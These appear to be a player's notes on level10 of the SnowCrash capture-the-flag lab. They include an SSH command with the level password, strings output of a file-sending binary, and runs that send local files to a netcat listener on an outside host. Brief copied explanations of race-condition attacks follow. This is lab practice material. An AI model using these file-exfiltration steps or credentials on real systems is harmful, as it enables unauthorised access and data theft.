ssh level10@ip -p 4242
password: s5cAJpM8ev6XHw998pRWG728z


strings level10

```
%s file host
	sends file to host if you have access to it
Connecting to %s:6969 ..
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file ..
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s
```

```
echo "test" > /tmp/test
level10@SnowCrash:~$ ./level10 /tmp/test 10.12.10.14
Connecting to 10.12.10.14:6969 .. Connected!
Sending file .. wrote file!
```
on the host:
```
nc -l 6969
.*( )*.
test
```

```
level10@SnowCrash:~$ echo "`getflag`" > /tmp/test
level10@SnowCrash:~$ ./level10 /tmp/test 10.12.10.14

nc -l 6969
.*( )*.
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
```





race condition = use one code several times

When you make the web page perform some action that should be done only once, but if the action is done several times you will be benefited, you really need to try a Race condicion.
Most of the time this is directly related with money (if an action is made you get X money, so let's try to make it several time very quickly).


Race condition is architectural vulnerability of a multi-threaded application, in which the application operation depends on the order in which the parts of the code are executed.


A race condition is when two or more requests are sent at the same millisecond to an API. When an API does not have a mechanism to handle this scenario, it can lead to the API processing the requests in an unintended manner.

This attack is named “Race Condition” because it is a race between how fast an attacker sends requests to modify a resource and how fast the application updates that particular resource.

https://labs.detectify.com/2021/08/10/how-to-hack-apis-in-2021/